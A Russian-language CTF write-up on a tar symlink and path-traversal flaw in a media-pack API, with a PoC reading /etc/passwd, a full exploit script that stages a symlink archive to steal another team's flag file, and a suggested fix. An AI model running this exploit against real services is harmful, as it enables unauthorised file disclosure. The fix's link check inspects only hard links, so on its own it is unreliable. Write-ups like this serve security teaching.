# LFI через Symlink на TAR

## как найти

`ruff check --select S app`

```bash
```
S202 Uses of `tarfile.extractall()`
   --> app/ecus/infotainment.py:338:9
    |
336 |     target.mkdir(parents=True, exist_ok=True)
337 |     with tarfile.open(fileobj=io.BytesIO(archive_bytes), mode="r:*") as archive:
338 |         archive.extractall(target)
    |     
```
```


## description

```python
@app.post("/api/media/pack")
async def media_pack(payload: dict[str, Any]) -> dict[str, object]:
    archive = _decode_b64(payload.get("tar_b64"), label="tar_b64")
    try:
        extracted = await _maybe_await(runtime.infotainment.extract_media_pack(archive))
    except AttributeError as exc:
        raise _json_error(501, "media-pack handler unavailable") from exc
    except Exception as exc:
        raise _json_error(422, "media pack rejected") from exc
    return {"files": extracted}
```

Эта функция распаковывает с помощью extract_media_pack архив, который хавает симлинки и всратые пути типа ../foo

здесь мы можем

- перезаписать наш бинарь
- сделать линк на другой .flag файл (его имя давалось в attack-data) (наш путь в этом райтапе)

Для того, чтобы выбить LFI на системе, нам нужна ручка, которая его дает. Единственное место, которое нашел мне клод -- флаги. *.flag файлы.
Для того, чтобы вообще хоть какой-то флаг прочитать, 
- нужно зарегаться
- добавить mp3 файл (добавление mp3 дает track_id, а track_id и есть имя *.flag файла, оно нам понадобиться, чтобы потом мы могли сделать на него симлинк)
- закинуть тарник
- прочитать наш трек, который мы вкинули в архив (тут флаг)

## PoC (python 3.12)

```python
>>> import tarfile
>>> ar = tarfile.open('archive.tar', mode='w')
>>> file = tarfile.TarInfo('somefile')
>>> file.type = tarfile.SYMTYPE
>>> file.linkname = '../../../../../../etc/passwd'
>>> ar.addfile(file)
>>> ar.close()
>>>
>>> ar = tarfile.open('archive.tar')
>>> ar.extractall()
>>> open('somefile').read()
'root:x:0:0::/root:/usr/bin/bash\nbin:x:1:1::/:/usr/bin/nologin...'
```

### sploit

```python
import requests

import tarfile
import io
import base64


attack_target = "<attackdata>.flag"


def attack():
    burp0_url = "http://localhost:8080/api/media/register"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {"p": "12asdsadsad3", "u": "mmeasdsadas"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

    burp0_url = "http://localhost:8080/api/media/upload"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {
        "mp3_b64": "somebase64",
        "p": "12asdsadsad3",
        "u": "mmeasdsadas",
    }

    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

    my_filename = r.json().get("track_id")

    filename = io.BytesIO()
    with tarfile.open(fileobj=filename, mode="w|") as tar:
        file = tarfile.TarInfo(f"../../../{my_filename}.flag")
        file.type = tarfile.SYMTYPE
        file.linkname = f"{attack_target}"
        tar.addfile(file)
    filename.seek(0)
    tarcontent = base64.b64encode(filename.read())

    burp0_url = "http://localhost:8080/api/media/pack"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Target-User": "6c8WhJLub3Jgfn3VUjjbNzXC",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {"tar_b64": tarcontent.decode()}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

    burp0_url = f"http://localhost:8080/api/media/flag/{my_filename}?u=mmeasdsadas&p=12asdsadsad3"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Target-User": "6c8WhJLub3Jgfn3VUjjbNzXC",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(r.text)

attack()
```
```
```



### fix

Варианта фикса два: указать в функции распаовки фильтр tar.extractall(filter='data')
Или валидировать симлинки

```python
for member in tar.getmembers():
    if not member.islnk():
        continue
    if os.pardir in os.path.split(member.linkname):
        raise OSError("Tarfile with insecure segment ('..') in linkname")

tar.extractall(filter="data")
```

